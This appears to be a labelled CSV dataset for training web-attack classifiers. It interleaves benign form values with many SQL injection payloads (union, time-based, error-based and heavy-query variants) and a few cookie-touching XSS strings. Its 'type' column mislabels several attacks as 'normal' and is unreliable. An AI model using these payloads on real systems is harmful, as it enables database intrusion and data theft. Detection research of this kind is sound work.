Text,attack_type,Label,type
1')));select (case when (9246=6326) then 9246 else 9246*(select 9246 from mysql.db) end)#,sqli,1,sql
"-1<div style=""binding: url([link to code]);"">",xss,2,sql
l680jis45,norm,0,normal
cadaqus,norm,0,normal
1%')) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('%'=',sqli,1,sql
"-5859) as ernq where 8394=8394 union all select 8394,8394,8394--",sqli,1,sql
yun,norm,0,normal
-7345) union all select 3866#,sqli,1,sql
"1' and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and 'vunt'='vunt",sqli,1,normal
glazer,norm,0,normal
"1"" procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)",sqli,1,sql
"1%"")) union all select null,null,null,null,null,null--",sqli,1,sql
"-6548%"") union all select 6067,6067,6067,6067,6067,6067,6067,6067,6067--",sqli,1,sql
07951538r,norm,0,normal
"1 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))# jpau",sqli,1,sql
barker ropero,norm,0,normal
1342i3,norm,0,normal
clavering@pinturasultravioleta.pro,norm,0,normal
50780,norm,0,normal
"1%"" procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ""%""=""",sqli,1,sql
02858717r,norm,0,normal
"1')) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
"1"" or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,normal
7378889316326396,norm,0,normal
"calle matula, s/n,",norm,0,normal
song@eyewear.nom.aw,norm,0,normal
"c/ ciutat freta, 37",norm,0,normal
02246,norm,0,normal
"1' where 9241=9241 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
haiping,norm,0,normal
dagmar,norm,0,normal
"calle transversal de poniente, 71,",norm,0,normal
pavn taracena,norm,0,normal
c4l6716o,norm,0,normal
19283115f,norm,0,normal
otorgamiento,norm,0,normal
cabr,norm,0,normal
1) as cinw where 3732=3732 and 8594=(select 8594 from pg_sleep(5))--,sqli,1,sql
06370,norm,0,normal
concursado,norm,0,normal
"1%' and make_set(8403=8403,8899) and '%'='",sqli,1,normal
"1"") as wjdc where 8694=8694 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--",sqli,1,sql
"1') and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ('cuat'='cuat",sqli,1,sql
"1') or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ('ekqv'='ekqv",sqli,1,normal
"calle madre de dios, 102",norm,0,normal
"1%')));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((('%'='",sqli,1,sql
"1') as ssez where 5351=5351 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
monserrat,norm,0,normal
zazulak,norm,0,normal
1')));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
6429,norm,0,normal
slaibe hipolit,norm,0,normal
3891386369836978,norm,0,normal
-3862') or 9323=9323#,sqli,1,normal
-6086')) or (6719=7280)*7280 and (('ozbj'='ozbj,sqli,1,normal
"1%""));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
"1"" where 4161=4161 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"1"") as vzdq where 3160=3160;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
sarteneja,norm,0,normal
"1""));select * from generate_series(6200,6200,case when (6200=5449) then 1 else 0 end) limit 1--",sqli,1,sql
albercoque,norm,0,normal
bova@atorre.cc,norm,0,normal
"1%';select count(*) from generate_series(1,5000000)--",sqli,1,sql
bancroft@lawn.mc,norm,0,normal
halm@sietepeines.ht,norm,0,normal
"-9718%"") union all select 9515,9515,9515#",sqli,1,sql
-6145 or (8459=8459)*4906-- yklv,sqli,1,sql
bernardette,norm,0,normal
"1"")) and (1248=8705)*8705 and ((""wvma"" like ""wvma",sqli,1,normal
9516066261417526,norm,0,normal
prdica,norm,0,normal
"1'));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (('fnna'='fnna",sqli,1,sql
"1%""))) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,normal
"1))) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
tornos,norm,0,normal
c/ juan perez arriete 19 13e,norm,0,normal
6ilia+ria,norm,0,normal
zorita de la frontera,norm,0,normal
"c/ radio segovia, 27,",norm,0,normal
1%'))) union all select null--,sqli,1,sql
95531349k,norm,0,normal
woolwine0,norm,0,normal
"caada de los ingleses, 117,",norm,0,normal
"1%';call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and '%'='",sqli,1,sql
"1) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (7338=7338",sqli,1,sql
"1'||(select 'osux' from dual where 7066=7066 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3))||'",sqli,1,sql
59323170y,norm,0,normal
3539419158271932,norm,0,normal
"1%"";(select * from (select(sleep(5)))acdk)#",sqli,1,sql
"1""))) and (7758=4628)*4628 and (((""wzas""=""wzas",sqli,1,normal
"1 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
"1"";begin user_lock.sleep(5); end--",sqli,1,sql
1'+(select 'gtqr' where 5660=5660;select pg_sleep(5)--,sqli,1,sql
"1)) or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,normal
"1' and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"calle opera 197,",norm,0,normal
sant jaume de frontany,norm,0,normal
"1"" and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ""exgr"" like ""exgr",sqli,1,sql
pedralba de la pradera,norm,0,normal
49622,norm,0,normal
1'||(select 'tvcy' where 5592=5592 order by 1#,sqli,1,sql
750,norm,0,normal
mathieso,norm,0,normal
feliu,norm,0,normal
"calle archidona 27, 11?a",norm,0,normal
35817134q,norm,0,normal
"1"")) as gvpm where 5170=5170 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
lehar,norm,0,normal
"paseo rey, 167 8-f",norm,0,normal
lugo,norm,0,normal
duo_davalos@designworld.cz,norm,0,normal
cary-whitten@magritte.pe,norm,0,normal
nebila,norm,0,normal
-1<style>@im\\port'\\ja asc ipt:document.cookie=true';</style>,xss,2,sql
"infantes de carrion, 122",norm,0,normal
saciedad,norm,0,normal
kaitlynn,norm,0,normal
oliveras dotras,norm,0,normal
1%') or 4240=(select 4240 from pg_sleep(5))--,sqli,1,sql
1%');waitfor delay '0:0:5' and ('%'=',sqli,1,sql
uju,norm,0,normal
schaafsma@gay-tantra.sj,norm,0,normal
estornin3,norm,0,normal
"1'||(select 'jjpy' from dual where 6295=6295;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"c/ vilagarcia de arousa, 188,",norm,0,normal
"1'||(select 'zrea' from dual where 1223=1223 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
1%') and (3020=3020)*6703 and ('%'=',sqli,1,normal
"altos de lillo, 137",norm,0,normal
"1"";select count(*) from generate_series(1,5000000)--",sqli,1,sql
51842682s,norm,0,normal
1' where 7191=7191 rlike sleep(5)--,sqli,1,sql
calle montes claros 9,norm,0,normal
"-5516'+(select 'bmlv' where 7188=7188 union all select 7188,7188,7188,7188,7188,7188,7188,7188#",sqli,1,sql
colmada,norm,0,normal
"1')) as vqrt where 5173=5173 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
1') as inid where 7812=7812 or 6793=(select 6793 from pg_sleep(5))--,sqli,1,sql
92937803r,norm,0,normal
"1) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
5458137818336951,norm,0,normal
5323,norm,0,normal
goyenaga,norm,0,normal
7333723607992322,norm,0,normal
ghose@perrosmodelo.tr,norm,0,normal
"1""))) and 2006=2006",sqli,1,normal
49327,norm,0,normal
2230,norm,0,normal
1') where 3861=3861;select pg_sleep(5)--,sqli,1,sql
josu,norm,0,normal
isidoro,norm,0,normal
topham.sperdakos5@forohh.ge,norm,0,normal
"1')))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((('owga' like 'owga",sqli,1,sql
"1)) as nlzg where 1482=1482 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",sqli,1,sql
46460133h,norm,0,normal
"-8673"") or make_set(9354=9354,7185) and (""edap"" like ""edap",sqli,1,normal
fabien,norm,0,normal
krysta,norm,0,normal
querbico,norm,0,normal
breceda perdig,norm,0,normal
"1')) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (('wqme'='wqme",sqli,1,sql
"1' in boolean mode) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
carmia,norm,0,normal
"-3775') as rqet where 7092=7092 or elt(1032=1032,3623)--",sqli,1,sql
3xp2n18va,norm,0,normal
pche,norm,0,normal
danis,norm,0,normal
8un03a,norm,0,normal
dorene6,norm,0,normal
indocto,norm,0,normal
1'||(select 'mlwj' from dual where 4247=4247 and 1702=8469)||',sqli,1,sql
1') as fxid where 5926=5926;if(7899=7899) select 7899 else drop function zbbp--,sqli,1,sql
03150,norm,0,normal
"-3562"") as eghl where 7094=7094 union all select 7094,7094,7094,7094#",sqli,1,sql
con2e5u934e1215e,norm,0,normal
pacheco_cox4@frenchpolynesia.com.ru,norm,0,normal
0379584529465876,norm,0,normal
8alantos4,norm,0,normal
"calle fresno, 66, 10?d",norm,0,normal
vanera,norm,0,normal
1')));waitfor delay '0:0:5' and ((('hrta'='hrta,sqli,1,sql
scanlon@theroxyblue.ng,norm,0,normal
"calle marques de montevirgen, 183",norm,0,normal
6079560291532789,norm,0,normal
9478,norm,0,normal
"-1<img dynsrc=""javascript:document.cookie=true;"">",xss,2,xss
ga27393,norm,0,normal
82301478a,norm,0,normal
"1"") and sleep(5) and (""ytof""=""ytof",sqli,1,normal
1710045357867718,norm,0,normal
deacetis,norm,0,normal
1' in boolean mode) and 6969=(select 6969 from pg_sleep(5))#,sqli,1,sql
21388,norm,0,normal
ella,norm,0,normal
"1') and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ('zpzf'='zpzf",sqli,1,sql
demarco_phuong@beesmer.me,norm,0,normal
46625,norm,0,normal
fiset,norm,0,normal
toinette,norm,0,normal
5388507530059847,norm,0,normal
6646364867316406,norm,0,normal
"1) where 5048=5048 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
9209,norm,0,normal
7385369805939657,norm,0,normal
porteril,norm,0,normal
1%'))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('%'=',sqli,1,sql
"1%"";select pg_sleep(5) and ""%""=""",sqli,1,sql
jongwoei,norm,0,normal
buffi-landi@tgcprint.st,norm,0,normal
malott,norm,0,normal
"1'+(select 'bztp' where 2541=2541 union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
-3105' or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and 'srep'='srep,sqli,1,sql
4129931718756477,norm,0,normal
waghorne,norm,0,normal
8776,norm,0,normal
"1"")) as azak where 4911=4911;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
"-2430') union all select 5712,5712,5712,5712,5712,5712,5712,5712,5712,5712--",sqli,1,sql
"calle doctor jose manuel pascual y pascual 146, 4?c",norm,0,normal
p1oro3o,norm,0,normal
"-2276"")) as qwow where 2321=2321 or 3534=2971--",sqli,1,sql
maracaja@telogis.ad,norm,0,normal
boa4@sitienesunawebtienesunnegocio.es,norm,0,normal
"-9408%"")) union all select 1841,1841,1841,1841,1841,1841--",sqli,1,sql
5083,norm,0,normal
realmente,norm,0,normal
yeo-hoon,norm,0,normal
05290,norm,0,normal
sufragio,norm,0,normal
"-1868)) union all select 1859,1859--",sqli,1,sql
ja34ico,norm,0,normal
"1'+(select 'yhcf' where 8367=8367;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
1') as wquy where 2518=2518;select sleep(5)#,sqli,1,sql
calle relleu 159,norm,0,normal
jaswal,norm,0,normal
novallas,norm,0,normal
78590398l,norm,0,normal
e11c5nt6o,norm,0,normal
nalbach0@softwaremasservicio.aero,norm,0,normal
manzanares bruguer,norm,0,normal
"-5131'))) union all select 4854,4854,4854,4854,4854,4854,4854#",sqli,1,sql
85089975a,norm,0,normal
1858844591273979,norm,0,normal
tardn,norm,0,normal
07150,norm,0,normal
"-4543"") or 3038=3038",sqli,1,normal
"1'))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('vjkf' like 'vjkf",sqli,1,sql
19325,norm,0,normal
"1'||(select 'ufgs' where 9670=9670 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))))||'",sqli,1,sql
"-6720'))) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('enfe' like 'enfe",sqli,1,sql
lulio,norm,0,normal
reddick,norm,0,normal
coray@ciaplast.ir,norm,0,normal
"1) where 1622=1622;select benchmark(5000000,md5(0x4c4d6142))--",sqli,1,sql
borox,norm,0,normal
albertini_trauberg@theroxyblue.jo,norm,0,normal
puellas sarlinga,norm,0,normal
"-6600') union all select 5566,5566#",sqli,1,sql
1' in boolean mode) and 3787=7750--,sqli,1,sql
zarzosa,norm,0,normal
88102583w,norm,0,normal
86979759s,norm,0,normal
4302979715945309,norm,0,normal
1'||(select 'xglm' from dual where 3556=3556 or 4240=(select 4240 from pg_sleep(5))--,sqli,1,sql
"1'||(select 'bgdh' from dual where 1967=1967;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
4629de1,norm,0,normal
77603o8ada,norm,0,normal
"calle padre payan 127,",norm,0,normal
"1')) as tfub where 3461=3461 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
2720344476520602,norm,0,normal
siana,norm,0,normal
lepe@eco-pro.mobi,norm,0,normal
"-5891 union all select 7103,7103,7103,7103--",sqli,1,sql
"nicaragua, 195,",norm,0,normal
gdowik2,norm,0,normal
"1'+(select 'ejox' where 2719=2719 union all select null,null,null#",sqli,1,sql
7987,norm,0,normal
igea,norm,0,normal
castellar de santiago,norm,0,normal
nafria mirambell,norm,0,normal
cab,norm,0,normal
1') and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ('ohqs' like 'ohqs,sqli,1,sql
1'||(select 'pcps' from dual where 7255=7255 and 7121=4603,sqli,1,sql
faust2@cocheacoche.cg,norm,0,normal
1' in boolean mode) or 4240=(select 4240 from pg_sleep(5))--,sqli,1,sql
"1"");select (case when (1868=5071) then 1 else 1868*(select 1868 from master..sysdatabases) end)--",sqli,1,sql
27654,norm,0,normal
66564863b,norm,0,normal
"-3964"") where 3566=3566 order by 1--",sqli,1,sql
"torres altas, 162",norm,0,normal
forcades chocano,norm,0,normal
6148304241486263,norm,0,normal
"(extractvalue(1759,concat(0x5c,0x7171706a71,(select (elt(1759=1759,1))),0x717a767a71)))",sqli,1,sql
"1%"") and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (""%""=""",sqli,1,sql
"-2125"")) or 8571=8571--",sqli,1,sql
mcgovern-boxter@buscadordevideos.ag,norm,0,normal
de5peadura,norm,0,normal
c/ tajonar 93 2e,norm,0,normal
1)) as xlww where 5844=5844;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1,sql
"1"" where 3080=3080 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",sqli,1,sql
1%' or sleep(5)#,sqli,1,normal
hollingw,norm,0,normal
"1') and elt(1210=1210,sleep(5)) and ('udvq'='udvq",sqli,1,normal
annette,norm,0,normal
clay9@showcars.cz,norm,0,normal
"1'));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (('rkoe'='rkoe",sqli,1,sql
sask,norm,0,normal
"1) as ooex where 1087=1087 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
"quevedo y quintana s/n, 4-h",norm,0,normal
"-5235) or make_set(9354=9354,7185)",sqli,1,normal
"1""))) and 7135=8805#",sqli,1,normal
sylvia,norm,0,normal
rudolf,norm,0,normal
"1%')) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
neel@deseoun.aq,norm,0,normal
grijota,norm,0,normal
72799603a,norm,0,normal
hemisfero,norm,0,normal
franka,norm,0,normal
7332706873817194,norm,0,normal
77452423s,norm,0,normal
leafloor,norm,0,normal
"1%') and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"1') as kqbh where 6138=6138;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"-6263%"")) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""%""=""",sqli,1,sql
"1'+(select 'yzxc' where 5230=5230 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))))+'",sqli,1,sql
96616229z,norm,0,normal
90660924f,norm,0,normal
"1)) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((2939=2939",sqli,1,normal
31588,norm,0,normal
4811716935763521,norm,0,normal
valsequillo de gran canaria,norm,0,normal
"1"") as kzuq where 4259=4259;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
ftpsites,norm,0,normal
kostka5@institutoandaluzdelmar.an,norm,0,normal
"-4772))) union all select 3879,3879,3879,3879,3879--",sqli,1,sql
